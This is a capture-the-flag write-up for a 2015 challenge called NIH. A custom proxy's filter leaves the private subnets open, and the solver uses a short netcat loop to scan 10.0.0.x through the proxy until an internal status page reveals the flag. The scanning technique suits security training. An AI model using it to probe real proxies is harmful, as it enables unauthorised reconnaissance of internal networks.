## HAXDUMP 2015 - NIH (Pwn 150)
##### 07/02/2015 (8hr)
___

### Description: 
NIH Inc. developed its own proxy server. I've heard its firewall is impenetrable, 
so don't bother trying to outsmart it.

Running at nih.haxdump.com port 9111
___
### Solution

A quick look on the source code shows that there are no "exploitable" bugs. We have a proxy server
here. What this means? The proxy may has access to some other machine in the internal network.
Let's see the filter function. We filter the subnets:
```
	127.0.0.0/8
	54.0.0.0/8
	0.0.0.0/8
```
But not the subnets:
```
	192.168.0.0/16
	172.16.0.0.16
	10.0.0/8
```
Let's try to connect to these networks ($i denotes a range 1-254):
```
	192.168.0.$i
	192.168.1.$i
	10.0.0.$i
	172.16.0.$i
	172.16.1.$i
```
Here's the script for doing this job:
```
	for ((i=0; i<256; i++)); 
	do 
		echo 10.0.0.$i | nc nih.haxdump.com 9111; 
	done
```
And the results are:
```
[..... TRUNCATED FOR BREVITY .....]
NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.57
NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.58
	HTTP/1.1 200 OK
	Date: Sat, 07 Feb 2015 21:52:23 GMT
	Server: Apache/2.4.7 (Ubuntu)
	Last-Modified: Tue, 03 Feb 2015 21:50:51 GMT
	ETag: "8c-50e36107e3f4e"
	Accept-Ranges: bytes
	Content-Length: 140
	Vary: Accept-Encoding
	Content-Type: text/html

	<html>
	 <body>
	  <h1>NIH Proxy Status</h1>
	  <p>
	   Host: 127.0.0.1<br/>
	   Flag: cache_invalidation_is_easier<br/>
	  </p>
	 </body>
	</html>
NIH Proxy
Specify an HTTP server to connect to
DNS is too hard; just provide an IP address
Connecting to 10.0.0.59
[..... TRUNCATED FOR BREVITY .....]
```
So the flag is: **cache_invalidation_is_easier**
___